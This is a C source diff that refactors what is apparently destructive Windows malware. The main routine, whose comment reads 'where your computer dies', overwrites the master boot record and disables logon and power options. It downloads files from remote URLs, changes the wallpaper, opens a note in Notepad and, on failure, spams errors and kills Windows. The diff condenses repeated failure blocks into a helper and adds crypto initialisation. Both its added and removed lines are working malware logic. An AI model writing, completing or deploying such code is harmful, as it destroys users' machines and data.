@@ -32,6 +32,8 @@
 
 #define VERSIONCOMP "next" // "bruh" for bruh version behavior
 
+int NOCRYPT = 0;
+
 /*------------------------------------------------+
 | Arguments payload (Used for development)        |
 | nosettings No MS-Settings payload               |
@@ -51,8 +53,10 @@
 
 int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
 {
-    // Arguments command line side 
-
+    // Init Crypt
+    if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) NOCRYPT = 1;
+    
+    // Arguments command line side
     int argc;
     LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
     if (argc > 1) {    
@@ -509,19 +513,8 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
         Fonts();
 
         // Destroy the MBR =)
-        if (argc > 1) {
-            if (!lstrcmpW(argv[1], L"skipdestroymbr")) {
-
-            }
-            else
-            {
-                DestroyMBR();
-            }
-        }
-        else
-        {
-            DestroyMBR();
-        }
+        if (not(argc > 1 && !lstrcmpW(argv[1], L"skipdestroymbr"))) DestroyMBR();
+        
         // Destroys MBR and continue
         DisableLogonOptions(); // Disable Logon Options, like Network and ShutDown
         DisablePowerOptions(); // Disable Power Options on LogonUI
@@ -536,55 +529,16 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
         
 
         DownloadFiles:
-
-        if (S_OK == URLDownloadToFile(NULL, srcURL, destFile, 0, NULL))
-        {
-            // success
-
-        }
-        // else kills os
-        else
-        {
-            CreateThread(NULL, NULL, &payloadThread, &StartErrorSpam, NULL, NULL);
-            int DisplayResourceNAMessageBox();
-            {
-                int msgboxID = MessageBox(
-                    NULL,
-                    (LPCWSTR)L"Unknown hard error",
-                    (LPCWSTR)L"Unwanted.exe - System Warning",
-                    MB_ICONWARNING | MB_OK
-                );
-            };
-            int argc;
-            LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
-            if (argc > 1) {
-                if (!lstrcmpW(argv[1], L"skipdestroymbr")) {
-
-                }
-                else
-                {
-                    DestroyMBR();
-                }
-            }
-            else
-            {
-                DestroyMBR();
-            }
-
-            CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
-            CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
-            Sleep(200);
-            CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
-
-            Sleep(992);
-
-            StartFuckingPC();
-            DisablePowerOptions();
-
-            return -1;
-        };
+        // Workaround:
+        // srcURL = panic.wav
+        // srcURLk = kitten.png
+		// srcURL1 = deskbgrd.jpg
+		// srcURL8 = paynt.rtf
 
         CreateDataFiles(); // Create notepads
+        CreateDesktopFiles(); // Create Desktop Files
+        
+        if (not(S_OK == URLDownloadToFile(NULL, srcURL, destFile, 0, NULL))) UnknownHradError();
 
         /* The part of downloading required files */
         if (S_OK == URLDownloadToFile(NULL, srcURL1, destFile1, 0, NULL))
@@ -592,99 +546,17 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
             Sleep(1000);
             const wchar_t* filenm = L"C:\\Program Files\\Common Files\\system\\deskbgrd.jpg";
             SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)filenm, SPIF_UPDATEINIFILE);
-            CreateDesktopFiles(); // Create Desktop Files
             // success
         }
         // else kills os
-        else
-        {
-            CreateThread(NULL, NULL, &payloadThread, &StartErrorSpam, NULL, NULL);
-            int DisplayResourceNAMessageBox();
-            {
-                int msgboxID = MessageBox(
-                    NULL,
-                    (LPCWSTR)L"Unknown hard error",
-                    (LPCWSTR)L"Unwanted.exe - System Warning",
-                    MB_ICONWARNING | MB_OK
-                );
-            };
-            int argc;
-            LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
-            if (argc > 1) {
-                if (!lstrcmpW(argv[1], L"skipdestroymbr")) {
+        else UnknownHradError(); 
 
-                }
-                else
-                {
-                    DestroyMBR();
-                }
-            }
-            else
-            {
-                DestroyMBR();
-            }
-
-            CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
-            CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
-            Sleep(200);
-            CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
-
-            Sleep(992);
-
-            StartFuckingPC();
-            DisablePowerOptions();
-
-            return -1;
-        };
-        if (S_OK == URLDownloadToFile(NULL, srcURL8, destFile8, 0, NULL))
-        {
-            // success
-
-        }
-        // else kills os
-        else
-        {
-            CreateThread(NULL, NULL, &payloadThread, &StartErrorSpam, NULL, NULL);
-            int DisplayResourceNAMessageBox();
-            {
-                int msgboxID = MessageBox(
-                    NULL,
-                    (LPCWSTR)L"Unknown hard error",
-                    (LPCWSTR)L"Unwanted.exe - System Warning",
-                    MB_ICONWARNING | MB_OK
-                );
-            };
-            int argc;
-            LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
-            if (argc > 1) {
-                if (!lstrcmpW(argv[1], L"skipdestroymbr")) {
-
-                }
-                else
-                {
-                    DestroyMBR();
-                }
-            }
-            else
-            {
-                DestroyMBR();
-            }
-
-            CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
-            CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
-            Sleep(200);
-            CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
-
-            Sleep(992);
-
-            StartFuckingPC();
-            DisablePowerOptions();
-
-            return -1;
-        };
+		if (not(S_OK == URLDownloadToFile(NULL, srcURL8, destFile8, 0, NULL))) UnknownHradError();
 
         const wchar_t* filenm = L"C:\\Program Files\\Common Files\\system\\deskbgrd.jpg"; // In case is not set, set it >:(
         SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)filenm, SPIF_UPDATEINIFILE);
+
+        if (not(S_OK == URLDownloadToFile(NULL, srcURLk, destFilek, 0, NULL))) UnknownHradError();
 
         // Open Notepad with the note
         ShellExecuteA(NULL, NULL, "notepad.exe", "C:\\note.txt", NULL, SW_SHOW);
@@ -692,67 +564,7 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
 
         Sleep(5000);
 
-        if (S_OK == URLDownloadToFile(NULL, srcURLk, destFilek, 0, NULL))
-        {
-            Sleep(300);
-            // success
-
-        }
-        // else kills os
-        else
-        {
-            CreateThread(NULL, NULL, &payloadThread, &StartErrorSpam, NULL, NULL);
-            int DisplayResourceNAMessageBox();
-            {
-                int msgboxID = MessageBox(
-                    NULL,
-                    (LPCWSTR)L"Unknown hard error",
-                    (LPCWSTR)L"Unwanted.exe - System Warning",
-                    MB_ICONWARNING | MB_OK
-                );
-            };
-            DestroyMBR();
-
-            int argc;
-            LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
-            if (argc > 1) {
-                if (!lstrcmpW(argv[1], L"skipdestroymbr")) {
-
-                }
-                else
-                {
-                    DestroyMBR();
-                }
-            }
-            else
-            {
-                DestroyMBR();
-            }
-
-            CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
-            CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
-            Sleep(200);
-            CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
-
-            Sleep(992);
-
-            StartFuckingPC();
-            DisablePowerOptions();
-
-            return -1;
-        };
-
-        // No main Payload - Payload =)
-        if (argc > 1) {
-            if (!lstrcmpW(argv[1], L"nomainpayload")) {
-                Sleep(300);
-                return 0;
-            }
-            else
-            {
-                // Still there
-            }
-        }
+		if (argc > 1 && !lstrcmpW(argv[1], L"nomainpayload")) ExitProcess(0); // Exit if nomainpayload argument
         
         /* Main Payload, where your computer dies */
 
